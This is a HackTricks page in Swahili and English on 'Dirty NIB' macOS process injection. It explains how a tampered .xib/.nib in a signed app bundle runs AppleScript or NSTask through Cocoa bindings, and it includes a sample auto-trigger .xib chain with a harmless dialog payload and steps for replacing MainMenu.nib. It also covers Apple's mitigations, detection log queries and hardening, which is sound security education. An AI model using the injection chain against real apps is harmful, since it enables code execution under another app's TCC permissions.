# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB inahusu kutumia vibaya faili za Interface Builder (.xib/.nib) zilizo ndani ya signed macOS app bundle ili kutekeleza logic inayodhibitiwa na attacker ndani ya target process, na hivyo kurithi entitlements na ruhusa zake za TCC. Mbinu hii iliandikwa awali na xpn (MDSec), kisha ikawekwa kwa matumizi ya jumla na kupanuliwa kwa kiasi kikubwa na Sector7, ambaye pia alieleza mitigations za Apple katika macOS 13 Ventura na macOS 14 Sonoma.<sup>[1][2]</sup> Kwa maelezo ya msingi na uchambuzi wa kina, tazama references zilizo mwishoni.

> TL;DR
> • Kabla ya macOS 13 Ventura: kubadilisha MainMenu.nib ya bundle (au nib nyingine inayopakiwa wakati wa startup) kungeweza kufanikisha process injection kwa uhakika na mara nyingi privilege escalation.
> • Tangu macOS 13 (Ventura), na ikiwa imeboreshwa katika macOS 14 (Sonoma): first-launch deep verification, bundle protection, Launch Constraints, na ruhusa mpya ya TCC ya “App Management” kwa kiasi kikubwa huzuia nib tampering baada ya launch na apps zisizohusiana. Attacks bado zinaweza kufanyika katika hali maalum (kwa mfano, same-developer tooling inayorekebisha apps zake, au terminals ambazo mtumiaji ameziwekea App Management/Full Disk Access).


## What are NIB/XIB files

Nib (kifupi cha NeXT Interface Builder) ni faili za serialized UI object graphs zinazotumiwa na AppKit apps. Xcode za kisasa huhifadhi editable XML .xib files ambazo hukompiliwa kuwa .nib wakati wa build. App ya kawaida hupakia main UI yake kupitia `NSApplicationMain()` ambayo husoma key ya `NSMainNibFile` kutoka kwenye app’s Info.plist na kuunda object graph wakati wa runtime.

Key points zinazowezesha attack:
- NIB loading huunda arbitrary Objective-C classes bila kuzihitaji zifuate NSSecureCoding (nib loader ya Apple hutumia `init`/`initWithFrame:` kama fallback wakati `initWithCoder:` haipatikani).
- Cocoa Bindings zinaweza kutumiwa vibaya kuita methods wakati nibs zinaundwa, ikiwemo chained calls ambazo hazihitaji user interaction.


## Dirty NIB injection process (attacker view)

Mtiririko wa kawaida kabla ya Ventura:
1) Create a malicious .xib
- Add an `NSAppleScript` object (au “gadget” classes nyingine kama vile `NSTask`).
- Add an `NSTextField` ambayo title yake ina payload (kwa mfano, AppleScript au command arguments).
- Add one or more `NSMenuItem` objects zilizounganishwa kupitia bindings ili kuita methods kwenye target object.

2) Auto-trigger without user clicks
- Tumia bindings kuweka target/selector ya menu item, kisha uite private `_corePerformAction` method ili action itekelezwe moja kwa moja wakati nib inapopakiwa. Hii huondoa hitaji la user kubofya button.

Minimal example ya auto-trigger chain ndani ya .xib (imefupishwa kwa uwazi):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Hii inatekeleza uendeshaji wa kiholela wa AppleScript katika process lengwa wakati wa nib load.<sup>[1]</sup> Advanced chains zinaweza:
- Kuunda instances za arbitrary AppKit classes (kwa mfano, `NSTask`) na kuita methods zisizohitaji arguments kama `-launch`.
- Kuita selectors za kiholela zenye object arguments kupitia binding trick iliyo hapo juu.
- Kupakia AppleScriptObjC.framework ili kuunganisha na Objective-C na hata kuita C APIs zilizochaguliwa.
- Kwenye mifumo ya zamani ambayo bado inajumuisha Python.framework, kuunganisha na Python kisha kutumia `ctypes` kuita C functions za kiholela (utafiti wa Sector7).<sup>[2]</sup>

3) Replace app’s nib
- Copy target.app hadi eneo linaloweza kuandikwa, replace kwa mfano, `Contents/Resources/MainMenu.nib` na nib hasidi, kisha endesha target.app. Kabla ya Ventura, baada ya tathmini ya Gatekeeper ya mara moja, launches zilizofuata zilifanya shallow signature checks pekee, hivyo resources zisizotekelezeka (kama .nib) hazikufanyiwa re-validation.

Mfano wa AppleScript payload kwa test inayoonekana:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Ulinzi wa kisasa wa macOS (Ventura/Monterey/Sonoma/Sequoia)

Apple ilianzisha mitigations kadhaa za kimfumo zinazopunguza kwa kiasi kikubwa uwezekano wa kutumia Dirty NIB kwenye macOS za kisasa:<sup>[2]</sup>
- Uthibitishaji wa kina wa uzinduzi wa kwanza na ulinzi wa bundle (macOS 13 Ventura)
- Wakati wa kuendesha app yoyote kwa mara ya kwanza (iwe imewekwa quarantine au la), ukaguzi wa kina wa signature hufunika resources zote za bundle. Baada ya hapo, bundle inalindwa: ni apps kutoka kwa developer yuleyule pekee (au zinazoruhusiwa wazi na app) zinazoweza kurekebisha yaliyomo. Apps nyingine zinahitaji ruhusa mpya ya TCC ya “App Management” ili kuandika ndani ya bundle ya app nyingine.
- Launch Constraints (macOS 13 Ventura)
- Apps za mfumo/Apple-bundled haziwezi kunakiliwa mahali pengine na kuendeshwa; hii inazuia mbinu ya “copy to /tmp, patch, run” kwa apps za OS.
- Maboresho katika macOS 14 Sonoma
- Apple iliimarisha App Management na kurekebisha bypasses zinazojulikana (kwa mfano, CVE‑2023‑40450) zilizotajwa na Sector7. Python.framework iliondolewa awali (macOS 12.3), jambo lililovunja baadhi ya privilege-escalation chains.
- Mabadiliko ya Gatekeeper/Quarantine
- Kwa mjadala mpana kuhusu Gatekeeper, provenance, na mabadiliko ya assessment yaliyoathiri technique hii, angalia ukurasa uliorejelewa hapa chini.

> Maana ya kimatendo
> • Kwenye Ventura+ kwa ujumla huwezi kurekebisha .nib ya app ya third-party isipokuwa process yako iwe na App Management au iwe imesainiwa kwa Team ID ileile ya target (kwa mfano, developer tooling).
> • Kutoa App Management au Full Disk Access kwa shells/terminals hufungua tena kwa ufanisi attack surface hii kwa chochote kinachoweza ku-execute code ndani ya context ya terminal hiyo.


### Kushughulikia Launch Constraints

Launch Constraints huzuia kuendesha apps nyingi za Apple kutoka locations zisizo za default kuanzia Ventura. Ikiwa ulikuwa ukitegemea workflows za kabla ya Ventura kama kunakili app ya Apple kwenye temp directory, kurekebisha `MainMenu.nib`, na kuizindua, tarajia hilo kushindwa kwenye >= 13.0.


## Kuhesabu targets na nibs (muhimu kwa utafiti / legacy systems)

- Tafuta apps ambazo UI yake inaendeshwa na nib:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Tafuta rasilimali za nib zinazoweza kufaa ndani ya bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Thibitisha saini za code kwa kina (itashindikana ikiwa uliingilia resources na hukusaini tena):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Kumbuka: Kwenye macOS za kisasa pia utazuiwa na bundle protection/TCC unapojaribu kuandika kwenye bundle ya app nyingine bila authorization inayofaa.


## Vidokezo vya Detection na DFIR

- File integrity monitoring kwenye bundle resources
- Fuatilia mabadiliko ya mtime/ctime kwenye `Contents/Resources/*.nib` na resources nyingine zisizo executable katika apps zilizosakinishwa.
- Unified logs na tabia ya process
- Fuatilia utekelezaji usiotarajiwa wa AppleScript ndani ya GUI apps na processes zinazopakia AppleScriptObjC au Python.framework. Mfano:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proactive assessments
- Tekeleza mara kwa mara `codesign --verify --deep` kwenye apps muhimu ili kuhakikisha resources zinabaki salama.
- Muktadha wa privileges
- Kagua ni nani/nini iliyo na TCC “App Management” au Full Disk Access (hasa terminals na management agents). Kuondoa hizi kutoka kwenye shells za matumizi ya jumla huzuia kuamilisha tena kwa urahisi tampering ya aina ya Dirty NIB.


## Defensive hardening (developers na defenders)

- Pendelea programmatic UI au punguza vitu vinavyoanzishwa kutoka kwenye nibs. Epuka kujumuisha classes zenye nguvu (kwa mfano, `NSTask`) kwenye nib graphs na epuka bindings zinazoita selectors kwa njia isiyo ya moja kwa moja kwenye objects zisizo za kuaminika.
- Tumia hardened runtime pamoja na Library Validation (ambayo tayari ni kiwango cha kawaida kwa apps za kisasa). Ingawa hii haizuii nib injection yenyewe, inazuia native code loading iliyo rahisi na kuwalazimisha attackers kutumia payloads za scripting pekee.
- Usiombe au kutegemea permissions pana za App Management kwenye tools za matumizi ya jumla. Ikiwa MDM inahitaji App Management, tenga muktadha huo na shells zinazoendeshwa na mtumiaji.
- Thibitisha mara kwa mara integrity ya app bundle yako na ufanye update mechanisms zako zijirekebishe zenyewe bundle resources.


## Related reading in HackTricks

Jifunze zaidi kuhusu Gatekeeper, quarantine na mabadiliko ya provenance yanayoathiri technique hii:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## References

- [1] [xpn – DirtyNIB (original write‑up with Pages example)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (April 5, 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
